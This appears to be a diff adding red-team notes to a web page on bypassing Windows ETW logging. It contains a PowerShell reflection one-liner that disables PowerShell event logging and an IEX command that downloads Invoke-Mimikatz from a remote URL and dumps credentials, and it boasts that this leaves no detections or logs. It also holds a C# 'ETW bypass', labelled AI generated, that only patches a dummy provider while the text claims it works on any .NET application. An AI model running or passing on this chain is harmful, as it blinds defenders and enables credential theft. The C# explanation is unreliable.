@@ -238,6 +238,150 @@ Microsoft-Windows-Threat-Intelligence</p>
 </tbody></table>
 <p>https://github.com/Lsecqt-Sponsors/Haunt_Agent/blob/main/Payload_Type/haunt/haunt/agent_code/etw.ps1
 https://github.com/MHaggis/PowerShell-Hunter</p>
+<p>https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</p>
+<p>run after amsi bypass:</p>
+<pre><code class="language-powershell">[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+</code></pre>
+<p>then run</p>
+<pre><code class="language-powershell">IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
+</code></pre>
+<p>No detections, AMSI is disabled, ETW is disabled -&gt; Check eventviewer -&gt; no powershell logs.</p>
+<h2><a class="header" href="#understanding-the-components" id="understanding-the-components">Understanding the Components:</a></h2>
+<ul>
+<li><strong><code>[Reflection.Assembly]::LoadWithPartialName('System.Core')</code>:</strong>
+<ul>
+<li>Loads the <code>System.Core.dll</code> assembly, containing core .NET classes, including <code>System.Diagnostics.Eventing.EventProvider</code>.</li>
+</ul>
+</li>
+<li><strong><code>.GetType('System.Diagnostics.Eventing.EventProvider')</code>:</strong>
+<ul>
+<li>Retrieves the <code>System.Diagnostics.Eventing.EventProvider</code> type, responsible for emitting ETW events.</li>
+</ul>
+</li>
+<li><strong><code>.GetField('m_enabled','NonPublic,Instance')</code>:</strong>
+<ul>
+<li>Retrieves the <code>m_enabled</code> field of the <code>EventProvider</code> class, a non-public instance field that determines whether ETW events are enabled.</li>
+</ul>
+</li>
+<li><strong><code>.SetValue(...)</code>:</strong>
+<ul>
+<li>Sets the value of the <code>m_enabled</code> field.</li>
+</ul>
+</li>
+<li><strong><code>[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')</code>:</strong>
+<ul>
+<li>Retrieves the <code>System.Management.Automation.Tracing.PSEtwLogProvider</code> type, a PowerShell-specific wrapper around the .NET ETW functionality.</li>
+</ul>
+</li>
+<li><strong><code>.GetField('etwProvider','NonPublic,Static').GetValue($null)</code>:</strong>
+<ul>
+<li>Retrieves the <code>etwProvider</code> field of the <code>PSEtwLogProvider</code> class, a non-public static field holding a reference to the <code>EventProvider</code> instance used by PowerShell.</li>
+</ul>
+</li>
+<li><strong><code>,0</code>:</strong>
+<ul>
+<li>Sets the <code>m_enabled</code> field to <code>0</code> (false), disabling ETW events for the PowerShell <code>EventProvider</code>.</li>
+</ul>
+</li>
+</ul>
+<h2><a class="header" href="#how-it-works-etw-bypass" id="how-it-works-etw-bypass">How It Works (ETW Bypass):</a></h2>
+<ul>
+<li>PowerShell uses the .NET <code>EventProvider</code> class to generate ETW events.</li>
+<li>The <code>PSEtwLogProvider</code> class in PowerShell acts as a bridge, holding the specific <code>EventProvider</code> instance used for PowerShell logging.</li>
+<li>The <code>m_enabled</code> field within the <code>EventProvider</code> class controls whether events are actually emitted.</li>
+<li>By using reflection, the code directly accesses and modifies this internal <code>m_enabled</code> field, setting it to <code>0</code>.</li>
+<li>This prevents the PowerShell <code>EventProvider</code> from generating ETW events, effectively bypassing ETW logging for that PowerShell process.</li>
+</ul>
+<p><img src="./images/etw_diag.jpg" alt="Screenshot" /></p>
+<h2><a class="header" href="#key-points" id="key-points">Key Points:</a></h2>
+<ul>
+<li>This method relies on internal .NET implementation details and might break if those details change in future .NET or PowerShell versions.</li>
+<li>It only affects the current PowerShell process.</li>
+<li>It is very effective at disabling the ETW logging from within powershell.</li>
+<li>This technique is commonly used by malicious actors.</li>
+<li>EDR solutions monitor for this type of activity.</li>
+</ul>
+<p>CSHARP CODE (AI Generated) using the same ETW bypass (also works for .net binaries)</p>
+<pre><code class="language-CSharp">using System;
+using System.Diagnostics.Eventing;
+using System.Reflection;
+
+public class EtwBypass
+{
+    public static void Main(string[] args)
+    {
+        try
+        {
+            // Get the EventProvider type
+            Type eventProviderType = typeof(EventProvider);
+
+            // Find the m_enabled field (non-public, instance)
+            FieldInfo mEnabledField = eventProviderType.GetField(&quot;m_enabled&quot;, BindingFlags.NonPublic | BindingFlags.Instance);
+
+            // Get the EventProvider instance used by the application (you'll need to adapt this part)
+            // This is the tricky part, as you need to find the specific instance you want to patch.
+            // In a real application, you would need to find the event provider instance that is used.
+            // This example creates a new instance just for demonstration.
+            EventProvider dummyProvider = new EventProvider(Guid.NewGuid());
+
+            // Set the m_enabled field to 0 (false)
+            if (mEnabledField != null)
+            {
+                mEnabledField.SetValue(dummyProvider, 0);
+                Console.WriteLine(&quot;ETW bypassed.&quot;);
+            }
+            else
+            {
+                Console.WriteLine(&quot;m_enabled field not found.&quot;);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
+        }
+    }
+}
+</code></pre>
+<h2><a class="header" href="#etw-patching-in-net-binaries-vs-powershell" id="etw-patching-in-net-binaries-vs-powershell">ETW Patching in .NET Binaries vs. PowerShell</a></h2>
+<p><strong>PowerShell Patch:</strong></p>
+<ul>
+<li>Uses reflection to modify the <code>PSEtwLogProvider</code> within the PowerShell process.</li>
+<li>Specifically targets how PowerShell logs events.</li>
+<li>Limited to the PowerShell process.</li>
+<li>Executed as a PowerShell command.</li>
+<li>Targets the PowerShell ETW logging mechanism.</li>
+</ul>
+<p><strong>.NET Binary Patch (C# Example):</strong></p>
+<ul>
+<li>Compiles into a standalone .NET executable.</li>
+<li>Uses reflection to directly modify the <code>EventProvider</code> class within the running .NET binary.</li>
+<li>Can patch ETW logging for any .NET application that uses the standard .NET <code>EventProvider</code> class, if the correct <code>EventProvider</code> instance can be located.</li>
+<li>Can affect any .NET application.</li>
+<li>Executed as a compiled executable.</li>
+<li>Targets the <code>EventProvider</code> class, allowing it to target any .NET application using that class.</li>
+</ul>
+<p><strong>Key Differences and Implications:</strong></p>
+<ul>
+<li><strong>Scope:</strong>
+<ul>
+<li>PowerShell patch: Limited to the PowerShell process.</li>
+<li>.NET binary patch: Can affect any .NET application, if the correct event provider can be located.</li>
+</ul>
+</li>
+<li><strong>Execution Context:</strong>
+<ul>
+<li>PowerShell patch: Executed as a PowerShell command.</li>
+<li>.NET binary patch: Executed as a compiled executable.</li>
+</ul>
+</li>
+<li><strong>Targeting:</strong>
+<ul>
+<li>Powershell patch: Targets the powershell ETW logging.</li>
+<li>.net binary patch: Targets the event provider class, so it can target any .net application that uses that class.</li>
+</ul>
+</li>
+</ul>
+<p><strong>In summary:</strong> The C# code provides a more general-purpose ETW patching mechanism that can be used independently of PowerShell, while the PowerShell one-liner is specific to the PowerShell environment.</p>
 
                     </main>
 
